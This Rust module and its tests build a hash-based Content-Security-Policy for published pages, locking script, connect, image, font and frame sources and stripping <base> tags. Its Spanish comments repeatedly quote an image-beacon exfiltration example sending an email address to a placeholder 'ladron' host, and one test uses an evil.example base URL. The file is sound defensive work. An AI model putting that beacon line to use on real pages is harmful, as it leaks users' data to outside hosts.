// Release seal — the terminal publish pass. Converts the pipeline's
// structural guarantee (sanitize_for_publish leaves a CLOSED script set:
// the injected form/analytics snippets plus at most the allowlisted
// Tailwind CDN) into an enforceable, externally verifiable policy:
//
//   <meta http-equiv="Content-Security-Policy"
//         content="script-src 'sha256-…' …; object-src 'none';
//                  base-uri 'none'; form-action 'self' https://openlen.com"
//         data-ol-csp>
//
// Even a sanitizer bypass becomes inert — an injected script's hash isn't
// in the policy, so the browser refuses to run it. Plus two cheap markup
// hardenings in the same walk: <base> tags stripped (base-uri belt-and-
// suspenders) and rel=noopener on every target=_blank anchor.
//
// MUST run after every script-injecting step (forms, analytics) and before
// the SHA/write — a script injected after sealing would be blocked by its
// own page's policy. The self-check below re-parses the serialized output
// and verifies every inline hash against the policy; on any drift the
// ORIGINAL html is returned (the seal fails, the publish never does).
//
// Deliberate scope notes:
//   - frame-ancestors can't ship via <meta> (spec-ignored) — Caddy's
//     X-Frame-Options covers it until per-release headers exist.
//   - style-src DOES ship now, with 'unsafe-inline': los <style> y los
//     atributos style sostienen todas las paginas, asi que no se prohibe el
//     estilo en linea — se acota de que ORIGENES puede venir un @import.
//     Junto con img/media/font, es lo que cierra la fuga por la puerta de
//     al lado que connect-src no ve.
//   - No SRI on the Tailwind CDN fallback: cdn.tailwindcss.com serves an
//     evergreen (unpinned) build, so a pinned hash would break the page on
//     their next deploy. The bake that removes the CDN is the real fix.
//   - A page carrying its own author CSP meta is left unsealed (two metas
//     intersect and could break authored behavior); base/noopener still
//     apply.

use base64::engine::general_purpose::STANDARD as BASE64;
use base64::Engine as _;
use kuchikiki::traits::TendrilSink;
use kuchikiki::{NodeData, NodeRef};
use sha2::{Digest, Sha256};

use super::{escape_attr, parse_fragment_children, serialize_doc};

#[derive(Debug)]
pub struct SealResult {
    pub html: String,
    /// True when the CSP meta is present in the output.
    pub sealed: bool,
    /// `'sha256-…'` source tokens, one per unique inline script.
    pub script_hashes: Vec<String>,
    /// Origins of external <script src> elements (the Tailwind CDN, when
    /// the bake fell back).
    pub external_scripts: Vec<String>,
    pub bases_stripped: u32,
    pub noopener_added: u32,
    pub errors: Vec<String>,
}

pub fn seal_release(
    html: &str,
    form_action_extra: Option<&str>,
    connect_src_extra: Option<&str>,
) -> SealResult {
    let doc = kuchikiki::parse_html().one(html);
    let mut errors: Vec<String> = Vec::new();

    // Idempotency: drop any seal from a prior run before re-measuring.
    detach_all(&doc, "meta[data-ol-csp]");

    let bases_stripped = detach_all(&doc, "base");
    let noopener_added = add_noopener(&doc);
    let (script_hashes, external_scripts, unparseable) = collect_scripts(&doc);

    let author_csp = doc
        .select("meta")
        .map(|it| {
            it.filter(|m| {
                m.attributes
                    .borrow()
                    .get("http-equiv")
                    .map(|v| v.eq_ignore_ascii_case("content-security-policy"))
                    .unwrap_or(false)
            })
            .count()
                > 0
        })
        .unwrap_or(false);

    let mut sealed = false;
    if author_csp {
        errors.push("author CSP meta present; left unsealed".to_string());
    } else if let Some(src) = unparseable {
        errors.push(format!("script src without a parseable origin: {src}"));
    } else {
        let has_3d = html.contains("data-ol-has-3d-block");
        let assets = collect_asset_origins(&doc);
        let policy = build_policy(&script_hashes, &external_scripts, form_action_extra, connect_src_extra, has_3d, &assets);
        inject_csp_meta(&doc, &policy);
        sealed = true;
    }

    let out = serialize_doc(&doc);

    // Self-check: the hashes in the policy must match the inline scripts as
    // they landed in the SERIALIZED bytes — any drift (a serializer quirk, a
    // future pass ordered after us) and we ship the original instead of a
    // page that blocks its own scripts.
    if sealed {
        let reparsed = kuchikiki::parse_html().one(out.as_str());
        let (verify_hashes, _, _) = collect_scripts(&reparsed);
        let mut expected = script_hashes.clone();
        let mut actual = verify_hashes;
        expected.sort();
        actual.sort();
        if expected != actual {
            return SealResult {
                html: html.to_string(),
                sealed: false,
                script_hashes,
                external_scripts,
                bases_stripped: 0,
                noopener_added: 0,
                errors: vec!["seal self-check failed: inline script hash drift".to_string()],
            };
        }
    }

    SealResult {
        html: out,
        sealed,
        script_hashes,
        external_scripts,
        bases_stripped,
        noopener_added,
        errors,
    }
}

fn detach_all(doc: &NodeRef, selector: &str) -> u32 {
    let nodes: Vec<NodeRef> = match doc.select(selector) {
        Ok(it) => it.map(|n| n.as_node().clone()).collect(),
        Err(_) => return 0,
    };
    let n = nodes.len() as u32;
    for node in nodes {
        node.detach();
    }
    n
}

fn add_noopener(doc: &NodeRef) -> u32 {
    let anchors: Vec<NodeRef> = match doc.select("a[target]") {
        Ok(it) => it.map(|n| n.as_node().clone()).collect(),
        Err(_) => return 0,
    };
    let mut added = 0u32;
    for a in anchors {
        let NodeData::Element(d) = a.data() else {
            continue;
        };
        let mut attrs = d.attributes.borrow_mut();
        let is_blank = attrs
            .get("target")
            .map(|t| t.eq_ignore_ascii_case("_blank"))
            .unwrap_or(false);
        if !is_blank {
            continue;
        }
        let rel = attrs.get("rel").unwrap_or("").to_string();
        let has = rel
            .split_whitespace()
            .any(|t| t.eq_ignore_ascii_case("noopener"));
        if !has {
            let new_rel = if rel.trim().is_empty() {
                "noopener".to_string()
            } else {
                format!("{} noopener", rel.trim())
            };
            attrs.insert("rel", new_rel);
            added += 1;
        }
    }
    added
}

/// Returns (unique inline-script hash tokens in document order, unique
/// external script origins, first unparseable src if any).
fn collect_scripts(doc: &NodeRef) -> (Vec<String>, Vec<String>, Option<String>) {
    let mut hashes: Vec<String> = Vec::new();
    let mut externals: Vec<String> = Vec::new();
    let mut unparseable: Option<String> = None;

    let scripts: Vec<NodeRef> = match doc.select("script") {
        Ok(it) => it.map(|n| n.as_node().clone()).collect(),
        Err(_) => return (hashes, externals, None),
    };
    for s in scripts {
        let src = {
            let NodeData::Element(d) = s.data() else {
                continue;
            };
            let attrs = d.attributes.borrow();
            attrs.get("src").map(str::to_string)
        };
        match src {
            Some(src) if !src.trim().is_empty() => match script_origin(src.trim()) {
                Some(origin) => {
                    if !externals.contains(&origin) {
                        externals.push(origin);
                    }
                }
                None => {
                    if unparseable.is_none() {
                        unparseable = Some(src);
                    }
                }
            },
            _ => {
                // Inline (or empty-src) script: hash the exact text content —
                // the same bytes the browser hashes when enforcing.
                let text = s.text_contents();
                let digest = Sha256::digest(text.as_bytes());
                let token = format!("'sha256-{}'", BASE64.encode(digest));
                if !hashes.contains(&token) {
                    hashes.push(token);
                }
            }
        }
    }
    (hashes, externals, unparseable)
}

/// `https://host[:port]` from an absolute script src; None for anything
/// else (relative, protocol-relative, data:) — those make the seal bail.
fn script_origin(src: &str) -> Option<String> {
    let (scheme, rest) = if let Some(r) = src.strip_prefix("https://") {
        ("https://", r)
    } else {
        let r = src.strip_prefix("http://")?;
        ("http://", r)
    };
    let host_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
    let host = &rest[..host_end];
    if host.is_empty() {
        return None;
    }
    Some(format!("{}{}", scheme, host.to_ascii_lowercase()))
}

/// Orígenes ajenos que el documento YA referencia, repartidos por directiva.
#[derive(Default)]
struct AssetOrigins {
    img: Vec<String>,
    media: Vec<String>,
    font: Vec<String>,
    style: Vec<String>,
}

fn push_origin(dst: &mut Vec<String>, raw: &str) {
    if let Some(o) = script_origin(raw.trim()) {
        if !dst.contains(&o) {
            dst.push(o);
        }
    }
}

/// Cada URL absoluta de un `srcset` ("a.jpg 1x, b.jpg 2x").
fn push_srcset(dst: &mut Vec<String>, raw: &str) {
    for parte in raw.split(',') {
        if let Some(u) = parte.split_whitespace().next() {
            push_origin(dst, u);
        }
    }
}

/// Las URLs dentro de `url(...)` de una hoja o un atributo `style`.
fn push_css_urls(dst: &mut Vec<String>, css: &str) {
    let bytes = css.as_bytes();
    let mut i = 0;
    while let Some(rel) = css[i..].find("url(") {
        let abre = i + rel + 4;
        let Some(largo) = css[abre..].find(')') else { break };
        let cruda = css[abre..abre + largo].trim().trim_matches([0x22 as char, 0x27 as char]);
        push_origin(dst, cruda);
        i = abre + largo;
        if i >= bytes.len() {
            break;
        }
    }
}

/// LO QUE EL DOCUMENTO YA PIDE, y nada más.
///
/// La lista NO se escribe a mano: se saca de la propia página. Toda imagen,
/// vídeo, fuente u hoja que esté en el documento tiene su origen permitido, así
/// que ninguna página existente se rompe. Lo que queda fuera es un origen
/// NUEVO, inventado en tiempo de ejecución — que es exactamente la forma de una
/// fuga: `new Image().src = "https://ladron/?" + correo`.
///
/// Importa porque esta política no tiene `default-src`: sin estas directivas,
/// img/media/font/style no estaban restringidos EN ABSOLUTO, y `connect-src`
/// por sí solo deja la puerta de las imágenes abierta de par en par.
fn collect_asset_origins(doc: &NodeRef) -> AssetOrigins {
    let mut o = AssetOrigins::default();
    if let Ok(nodos) = doc.select("img, source, video, audio, link, style, [style]") {
        for n in nodos {
            let nodo = n.as_node().clone();
            let NodeData::Element(d) = nodo.data() else { continue };
            let nombre = d.name.local.to_ascii_lowercase();
            let attrs = d.attributes.borrow();

            if let Some(v) = attrs.get("style") {
                push_css_urls(&mut o.img, v);
            }
            match &*nombre {
                "img" => {
                    if let Some(v) = attrs.get("src") { push_origin(&mut o.img, v); }
                    if let Some(v) = attrs.get("srcset") { push_srcset(&mut o.img, v); }
                }
                "source" => {
                    // Un <source> vive en <picture> (imagen) o en <video>/<audio>
                    // (media). Sin recorrer el padre no se sabe, así que su origen
                    // entra en los dos: permitir de más un origen QUE YA ESTÁ en la
                    // página no abre nada; dejarlo fuera rompe la página.
                    if let Some(v) = attrs.get("src") { push_origin(&mut o.img, v); push_origin(&mut o.media, v); }
                    if let Some(v) = attrs.get("srcset") { push_srcset(&mut o.img, v); push_srcset(&mut o.media, v); }
                }
                "video" | "audio" => {
                    if let Some(v) = attrs.get("src") { push_origin(&mut o.media, v); }
                    if let Some(v) = attrs.get("poster") { push_origin(&mut o.img, v); }
                }
                "link" => {
                    let rel = attrs.get("rel").unwrap_or("").to_ascii_lowercase();
                    let Some(href) = attrs.get("href") else { continue };
                    if rel.contains("stylesheet") { push_origin(&mut o.style, href); }
                    if rel.contains("preconnect") || rel.contains("dns-prefetch") {
                        // Google Fonts sirve la hoja desde fonts.googleapis.com y
                        // los ficheros desde fonts.gstatic.com, que sólo aparece en
                        // el preconnect. Sin esto, la tipografía se cae.
                        push_origin(&mut o.font, href);
                        push_origin(&mut o.style, href);
                    }
                    if rel.contains("icon") { push_origin(&mut o.img, href); }
                    if rel.contains("preload") {
                        match attrs.get("as").unwrap_or("") {
                            "font" => push_origin(&mut o.font, href),
                            "image" => push_origin(&mut o.img, href),
                            "video" | "audio" => push_origin(&mut o.media, href),
                            "style" => push_origin(&mut o.style, href),
                            _ => {}
                        }
                    }
                }
                _ => {}
            }
        }
    }
    // Las @font-face y los background-image de las hojas en línea.
    if let Ok(estilos) = doc.select("style") {
        for st in estilos {
            let texto = st.as_node().text_contents();
            push_css_urls(&mut o.img, &texto);
            push_css_urls(&mut o.font, &texto);
        }
    }
    o
}

/// Une `'self'` + los esquemas seguros + lo que el documento ya referencia.
fn fuente(base: &str, origenes: &[String]) -> String {
    if origenes.is_empty() {
        base.to_string()
    } else {
        format!("{} {}", base, origenes.join(" "))
    }
}

fn build_policy(
    hashes: &[String],
    externals: &[String],
    form_action_extra: Option<&str>,
    connect_src_extra: Option<&str>,
    has_3d: bool,
    assets: &AssetOrigins,
) -> String {
    // Pages with a 3D block load a same-origin runtime chunk dynamically (on tap),
    // so 'self' must be allowed in script-src for that page only.
    let script_src = if hashes.is_empty() && externals.is_empty() && !has_3d {
        "'none'".to_string()
    } else {
        let mut sources: Vec<&str> = hashes.iter().map(String::as_str).collect();
        sources.extend(externals.iter().map(String::as_str));
        if has_3d {
            sources.push("'self'");
        }
        sources.join(" ")
    };
    let form_action = match form_action_extra {
        Some(origin) if !origin.trim().is_empty() => format!("'self' {}", origin.trim()),
        _ => "'self'".to_string(),
    };
    // frame-src: defense-in-depth for the in-page video and map embeds. The
    // sanitizer already strips all user iframes; the only frames on a published
    // page are the canonical embeds our bakes inject — YouTube/Vimeo
    // (lib/publish/video-embed.ts) and Google Maps (lib/publish/map-embed.ts).
    // Locking frame-src to exactly those origins means any other iframe that
    // somehow slipped through is blocked by the page's own CSP.
    //
    // `https://www.google.com` cubre las DOS URLs del mapa: `?output=embed`
    // devuelve un 301 a `/maps/embed` en ese mismo origen (verificado con Chrome
    // real el 2026-08-23), así que no hace falta una segunda entrada.
    //
    // ⚠️ CADA ORIGEN NUEVO AQUÍ CUESTA UN REBUILD DEL MÓDULO NATIVO. Añadir
    // Spotify o Calendly es barato en TypeScript y caro en despliegue: si esta
    // lista y el bake se desincronizan, el embebido se inyecta y el navegador lo
    // bloquea — la página se ve bien en el editor y muerta al publicar, que es
    // la peor forma de fallar.
    // connect-src: LA directiva de salida, y faltaba. Como tampoco hay
    // `default-src` del que heredar, `fetch`, XHR, WebSocket, EventSource y
    // sendBeacon podían ir a CUALQUIER host. Mientras la página sólo lleva
    // script nuestro con hash no cambia nada; el día que lleve JavaScript
    // escrito por el modelo, esto es lo único que separa "una página
    // interactiva" de "un canal de salida".
    //
    // El conjunto sale de un inventario real de lo que emiten nuestros bakes:
    // los widgets (reservas, chat, comentarios, miembros) y la analítica llaman
    // a rutas RELATIVAS → 'self'; el EventSource del chat, también. El único
    // destino ajeno es el envío de formularios, que ya viaja en este mismo
    // parámetro. Que coincida con form-action no es casualidad: es el mismo
    // origen, por eso se reutiliza en vez de duplicar la fuente de verdad.
    //
    // `connect_src_extra` es la puerta de salida, y la decide TypeScript a
    // propósito: la POLÍTICA vive donde un interruptor es gratis, no aquí
    // dentro, donde cambiarla cuesta recompilar el módulo nativo y desplegar.
    // Con `None` el comportamiento es el de siempre, byte a byte.
    //
    // ⚠️ ABRIR ESTO ES ABRIR LA BARRERA, no una rendija. Las directivas de
    // abajo (img/media/font) existen para tapar la fuga por la puerta de al
    // lado —`new Image().src = "https://ladron/?" + correo`—; con `fetch`
    // libre, cerrarlas deja de proteger de la exfiltración. Lo que SIGUE
    // cerrado es `form-action`: los envíos de formulario sólo van a OpenLen.
    //
    // Lo que hace defendible abrirlo (decisión de Jesús, 2026-08-24): el
    // script del modelo está FIJADO POR HASH en esta misma CSP —no se puede
    // cambiar después de publicar— y el creador puede leerlo desde el visor
    // `</>` del taller. Es más control del que da cualquier hosting que sirve
    // páginas de usuario, y ninguno de ellos restringe connect-src.
    let connect_src = match connect_src_extra {
        Some(extra) if !extra.trim().is_empty() => format!("{} {}", form_action, extra.trim()),
        _ => form_action.clone(),
    };
    // worker-src 'none': ningún bake nuestro crea Worker, SharedWorker ni
    // service worker — comprobado en lib/publish, lib/three3d y este crate. Un
    // worker es el sitio natural donde esconder trabajo de red o de CPU, así
    // que se cierra antes de que exista la primera página que pueda abrirlo.
    // img/media/font/style: cerradas a lo que el documento YA pide.
    //
    // `connect-src` sola no basta. Sin estas, un script podía sacar datos por la
    // puerta de al lado —`new Image().src = "https://ladron/?" + correo`— y esa
    // vía no la ve ninguna de las directivas que ya había. Aquí está la
    // diferencia entre "no puede hacer peticiones" y "no puede filtrar".
    //
    // La lista de orígenes NO se escribe a mano: sale del propio documento, así
    // que toda imagen, vídeo o fuente que ya esté en la página sigue cargando.
    // Lo que queda fuera es un origen NUEVO, inventado en tiempo de ejecución —
    // que es exactamente la forma de una fuga.
    //
    // `data:` y `blob:` se permiten porque no salen a ninguna parte: son bytes
    // que ya viajan dentro de la página.
    //
    // `style-src` lleva 'unsafe-inline' porque los `<style>` y los atributos
    // `style` sostienen TODAS las páginas, y el CDN de Tailwind inyecta estilo
    // en tiempo de ejecución. Su valor aquí no es prohibir estilo en línea: es
    // acotar de qué ORÍGENES puede venir un `@import`.
    let img_src = fuente("'self' data: blob:", &assets.img);
    let media_src = fuente("'self' data: blob:", &assets.media);
    let font_src = fuente("'self' data:", &assets.font);
    let style_src = fuente("'self' 'unsafe-inline'", &assets.style);
    format!(
        "script-src {}; connect-src {}; worker-src 'none'; object-src 'none'; \
         base-uri 'none'; img-src {}; media-src {}; font-src {}; style-src {}; \
         frame-src https://www.youtube-nocookie.com https://player.vimeo.com https://www.google.com; \
         form-action {}",
        script_src, connect_src, img_src, media_src, font_src, style_src, form_action
    )
}

/// Insert the policy meta right after `<meta charset>` when present (charset
/// should stay first in head), else as the first child of <head>.
fn inject_csp_meta(doc: &NodeRef, policy: &str) {
    let Ok(head) = doc.select_first("head") else {
        return;
    };
    let head_node = head.as_node().clone();
    let meta_html = format!(
        r#"<meta http-equiv="Content-Security-Policy" content="{}" data-ol-csp>"#,
        escape_attr(policy)
    );
    let nodes = parse_fragment_children(&meta_html);

    let charset = doc
        .select("meta[charset]")
        .ok()
        .and_then(|mut it| it.next());
    if let Some(anchor) = charset {
        let anchor_node = anchor.as_node().clone();
        // insert_after reverses ordering for multiple nodes; we have one.
        for n in nodes {
            anchor_node.insert_after(n);
        }
    } else {
        for n in nodes.into_iter().rev() {
            head_node.prepend(n);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hash_token(text: &str) -> String {
        format!(
            "'sha256-{}'",
            BASE64.encode(Sha256::digest(text.as_bytes()))
        )
    }

    #[test]
    fn scriptless_page_gets_script_src_none() {
        let html = r#"<html><head><meta charset="utf-8"></head><body><p>hi</p></body></html>"#;
        let r = seal_release(html, None, None);
        assert!(r.sealed);
        assert!(r.html.contains("script-src 'none'"));
        assert!(r.html.contains("object-src 'none'"));
        assert!(r.html.contains("base-uri 'none'"));
        assert!(r.html.contains("form-action 'self'"));
        assert!(r
            .html
            .contains("frame-src https://www.youtube-nocookie.com https://player.vimeo.com https://www.google.com;"));
        assert!(r.html.contains("data-ol-csp"));
    }

    #[test]
    fn frame_src_locks_to_video_embed_origins() {
        // Only the canonical YouTube/Vimeo embed origins may be framed; the
        // sanitizer strips user iframes, so nothing else should ever be framed.
        let html = r#"<html><head></head><body><p>x</p></body></html>"#;
        let r = seal_release(html, None, None);
        assert!(r
            .html
            .contains("frame-src https://www.youtube-nocookie.com https://player.vimeo.com https://www.google.com;"));
        assert!(!r.html.contains("frame-src 'self'"));
        assert!(!r.html.contains("frame-src *"));
    }

    #[test]
    fn inline_script_hash_lands_in_policy() {
        let body = "console.log('hola');";
        let html = format!(
            r#"<html><head></head><body><script>{}</script></body></html>"#,
            body
        );
        let r = seal_release(&html, None, None);
        assert!(r.sealed);
        assert_eq!(r.script_hashes, vec![hash_token(body)]);
        assert!(r.html.contains(&hash_token(body)));
    }

    #[test]
    fn raw_text_script_with_operators_hashes_exact_bytes() {
        let body = "if(a<b&&c>0){fetch('/c/x',{keepalive:true})}";
        let html = format!(r#"<body><script>{}</script></body>"#, body);
        let r = seal_release(&html, None, None);
        assert!(r.sealed);
        assert_eq!(r.script_hashes, vec![hash_token(body)]);
        // Serialization must not have altered the script body (self-check
        // would have caught it, but assert directly too).
        assert!(r.html.contains(body));
    }

    #[test]
    fn external_cdn_script_allowlisted_by_origin() {
        let html =
            r#"<head><script src="https://cdn.tailwindcss.com"></script></head><body></body>"#;
        let r = seal_release(html, None, None);
        assert!(r.sealed);
        assert_eq!(r.external_scripts, vec!["https://cdn.tailwindcss.com"]);
        assert!(r.html.contains("script-src https://cdn.tailwindcss.com;"));
    }

    #[test]
    fn mixed_inline_and_external_both_in_policy() {
        let html = r#"<head><script src="https://cdn.tailwindcss.com/"></script></head><body><script>x()</script></body>"#;
        let r = seal_release(html, None, None);
        assert!(r.sealed);
        assert!(r.html.contains(&hash_token("x()")));
        assert!(r.html.contains("https://cdn.tailwindcss.com"));
    }

    #[test]
    fn duplicate_inline_scripts_hash_once() {
        let html = r#"<body><script>same()</script><script>same()</script></body>"#;
        let r = seal_release(html, None, None);
        assert_eq!(r.script_hashes.len(), 1);
    }

    #[test]
    fn base_tags_stripped() {
        let html = r#"<html><head><base href="https://evil.example/"></head><body></body></html>"#;
        let r = seal_release(html, None, None);
        assert_eq!(r.bases_stripped, 1);
        assert!(!r.html.contains("<base"));
    }

    #[test]
    fn target_blank_gains_noopener_preserving_rel_tokens() {
        let html = r#"<body><a href="https://x.com" target="_blank" rel="nofollow">x</a><a href="/in" target="_self">y</a></body>"#;
        let r = seal_release(html, None, None);
        assert_eq!(r.noopener_added, 1);
        assert!(r.html.contains(r#"rel="nofollow noopener""#));
    }

    #[test]
    fn existing_noopener_not_duplicated() {
        let html = r#"<body><a href="https://x.com" target="_blank" rel="noopener">x</a></body>"#;
        let r = seal_release(html, None, None);
        assert_eq!(r.noopener_added, 0);
        assert_eq!(r.html.matches("noopener").count(), 1);
    }

    #[test]
    fn form_action_extra_origin_included() {
        let html = "<html><head></head><body></body></html>";
        let r = seal_release(html, Some("https://openlen.com"), None);
        assert!(r.html.contains("form-action 'self' https://openlen.com"));
    }

    /// LA DIRECTIVA DE SALIDA. La política no tiene `default-src`, así que sin
    /// `connect-src` explícito `fetch`/XHR/WebSocket/EventSource/sendBeacon
    /// podían ir a cualquier host. Quien borre esta línea reabre exactamente
    /// eso, y no habría ningún otro síntoma.
    #[test]
    fn connect_src_confines_egress_to_self_and_submit_origin() {
        let html = "<html><head></head><body></body></html>";
        let r = seal_release(html, Some("https://openlen.com"), None);
        assert!(r.sealed);
        assert!(r.html.contains("connect-src 'self' https://openlen.com"));
        // Sin origen de envío no se cuela un comodín: se queda en 'self'.
        let solo = seal_release(html, None, None);
        assert!(solo.html.contains("connect-src 'self';"));
        assert!(!solo.html.contains("connect-src *"));
    }

    // La salida de red de una página publicada. La POLÍTICA la decide
    // TypeScript (`pageNetworkExtra`); aquí sólo se comprueba que el parámetro
    // llega a `connect-src` y NO se cuela en `form-action`, que es la promesa
    // que sigue en pie: los envíos de formulario van sólo a OpenLen.
    #[test]
    fn connect_src_extra_abre_la_red_sin_tocar_form_action() {
        let html = "<html><head></head><body><form></form></body></html>";
        let r = seal_release(html, Some("https://openlen.com"), Some("https: wss:"));
        let csp = r.html.clone();
        assert!(csp.contains("connect-src 'self' https://openlen.com https: wss:"), "{csp}");
        // Con la comilla de cierre: `form-action` es la ÚLTIMA directiva, así
        // que si `https: wss:` se hubiera colado ahí, esto no casaría.
        assert!(csp.contains("form-action 'self' https://openlen.com\""), "{csp}");
    }

    #[test]
    fn sin_extra_el_sello_es_el_de_siempre() {
        // Byte a byte: el kill-switch tiene que devolver EXACTAMENTE lo de
        // antes, o revertir no sería revertir.
        let html = "<html><head></head><body><p>x</p></body></html>";
        let a = seal_release(html, Some("https://openlen.com"), None);
        let b = seal_release(html, Some("https://openlen.com"), Some("   "));
        assert_eq!(a.html, b.html);
    }

    /// Ningún bake nuestro crea Worker ni service worker — es el sitio natural
    /// donde esconder red o CPU, así que se cierra antes de que exista la
    /// primera página capaz de abrir uno.
    #[test]
    fn worker_src_is_closed() {
        let r = seal_release("<html><head></head><body></body></html>", None, None);
        assert!(r.html.contains("worker-src 'none'"));
    }

    /// LA PUERTA DE AL LADO. `connect-src` no la ve: `new Image().src` no es una
    /// petición de red a efectos de esa directiva, y sin `default-src` no había
    /// NADA restringiendo las imágenes. Es la vía de fuga más barata que existe.
    #[test]
    fn img_src_is_closed_to_unknown_origins() {
        let r = seal_release("<html><head></head><body><p>x</p></body></html>", None, None);
        assert!(r.sealed);
        assert!(r.html.contains("img-src 'self' data: blob:;"));
        assert!(r.html.contains("media-src 'self' data: blob:"));
        assert!(r.html.contains("font-src 'self' data:"));
    }

    /// Y NO ROMPE LAS PÁGINAS QUE YA EXISTEN: la lista no se escribe a mano, se
    /// saca del documento. Todo lo que la página ya pide sigue cargando.
    #[test]
    fn origins_already_in_the_document_stay_allowed() {
        let html = r#"<html><head>
            <link rel="preconnect" href="https://fonts.gstatic.com">
            <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">
            <style>.h{background-image:url("https://images.openlen.com/a.webp")}</style>
            </head><body>
            <img src="https://images.openlen.com/b.webp">
            <video src="https://cdn.ejemplo.test/v.mp4" poster="https://otro.test/p.jpg"></video>
            </body></html>"#;
        let r = seal_release(html, None, None);
        assert!(r.sealed);
        let csp = r.html.clone();
        // La imagen, el fondo por CSS y el póster del vídeo.
        assert!(csp.contains("https://images.openlen.com"));
        assert!(csp.contains("https://otro.test"));
        // El vídeo, en media-src.
        assert!(csp.contains("https://cdn.ejemplo.test"));
        // Google Fonts entero: la hoja y los ficheros, que sólo aparecen en el
        // preconnect. Sin esto la tipografía de media plataforma se cae.
        assert!(csp.contains("https://fonts.googleapis.com"));
        assert!(csp.contains("https://fonts.gstatic.com"));
    }

    /// Un origen que NO está en el documento no entra. Ésa es toda la defensa:
    /// el script sólo puede pedir a donde la página ya pedía.
    #[test]
    fn an_origin_not_in_the_document_is_not_allowed() {
        let html = r#"<html><head></head><body><img src="https://images.openlen.com/a.webp"></body></html>"#;
        let r = seal_release(html, None, None);
        assert!(r.html.contains("https://images.openlen.com"));
        assert!(!r.html.contains("ladron.test"));
    }

    /// `style-src` acota el ORIGEN de un `@import`, no prohíbe el estilo en
    /// línea: los `<style>` y los atributos `style` sostienen todas las páginas,
    /// y el CDN de Tailwind inyecta estilo en tiempo de ejecución.
    #[test]
    fn style_src_keeps_inline_working() {
        let r = seal_release("<html><head><style>p{color:red}</style></head><body></body></html>", None, None);
        assert!(r.html.contains("style-src 'self' 'unsafe-inline'"));
    }

    #[test]
    fn author_csp_meta_leaves_page_unsealed_but_hardened() {
        let html = r#"<html><head><meta http-equiv="Content-Security-Policy" content="default-src 'self'"><base href="/x"></head><body></body></html>"#;
        let r = seal_release(html, None, None);
        assert!(!r.sealed);
        assert!(!r.html.contains("data-ol-csp"));
        assert!(r.html.contains("default-src 'self'")); // author meta intact
        assert_eq!(r.bases_stripped, 1);
        assert_eq!(r.errors.len(), 1);
    }

    #[test]
    fn relative_script_src_bails_without_meta() {
        let html = r#"<body><script src="/js/app.js"></script></body>"#;
        let r = seal_release(html, None, None);
        assert!(!r.sealed);
        assert!(!r.html.contains("data-ol-csp"));
        assert_eq!(r.errors.len(), 1);
    }

    #[test]
    fn meta_placed_after_charset() {
        let html =
            r#"<html><head><meta charset="utf-8"><title>t</title></head><body></body></html>"#;
        let r = seal_release(html, None, None);
        let charset_pos = r.html.find("charset").unwrap();
        let csp_pos = r.html.find("data-ol-csp").unwrap();
        let title_pos = r.html.find("<title>").unwrap();
        assert!(charset_pos < csp_pos && csp_pos < title_pos);
    }

    #[test]
    fn meta_first_in_head_without_charset() {
        let html = r#"<html><head><title>t</title></head><body></body></html>"#;
        let r = seal_release(html, None, None);
        let csp_pos = r.html.find("data-ol-csp").unwrap();
        let title_pos = r.html.find("<title>").unwrap();
        assert!(csp_pos < title_pos);
    }

    #[test]
    fn reseal_is_idempotent() {
        let html = r#"<html><head><meta charset="utf-8"></head><body><a href="https://x.com" target="_blank">x</a><script>go()</script></body></html>"#;
        let once = seal_release(html, Some("https://openlen.com"), None);
        let twice = seal_release(&once.html, Some("https://openlen.com"), None);
        assert!(twice.sealed);
        assert_eq!(once.html, twice.html);
        assert_eq!(once.html.matches("data-ol-csp").count(), 1);
    }

    #[test]
    fn policy_survives_attribute_escaping_roundtrip() {
        // The policy value carries single quotes — they must serialize intact
        // inside the double-quoted content attribute.
        let html = r#"<body><script>q()</script></body>"#;
        let r = seal_release(html, None, None);
        assert!(r.html.contains("content=\"script-src 'sha256-"));
    }

    /// Extract the value of the `script-src` directive from a CSP string
    /// (everything between "script-src " and the next ";").
    fn extract_script_src(html: &str) -> String {
        let start = html
            .find("script-src")
            .expect("should have script-src directive");
        let rest = &html[start + "script-src".len()..];
        let end = rest.find(';').unwrap_or(rest.len());
        rest[..end].trim().to_string()
    }

    #[test]
    fn adds_self_to_script_src_only_when_3d_block_present() {
        let with_3d = "<html><head></head><body><div data-ol-has-3d-block></div><script>1</script></body></html>";
        let plain = "<html><head></head><body><script>1</script></body></html>";

        let sealed_3d = seal_release(with_3d, None, None);
        let sealed_plain = seal_release(plain, None, None);

        assert!(sealed_3d.sealed, "3D page should be sealed");
        assert!(sealed_plain.sealed, "plain page should be sealed");

        // 3D page: script-src directive must include 'self' so the same-origin
        // runtime chunk created on tap can load. Note: form-action always has
        // 'self' too — we must check within the script-src directive only.
        let script_src_3d = extract_script_src(&sealed_3d.html);
        assert!(
            script_src_3d.contains("'self'"),
            "3D page script-src must include 'self'; got script-src: {:?}",
            script_src_3d
        );

        // Plain page: 'self' must NOT appear in the script-src directive.
        let script_src_plain = extract_script_src(&sealed_plain.html);
        assert!(
            !script_src_plain.contains("'self'"),
            "non-3D page must not gain 'self' in script-src; got script-src: {:?}",
            script_src_plain
        );
    }
}
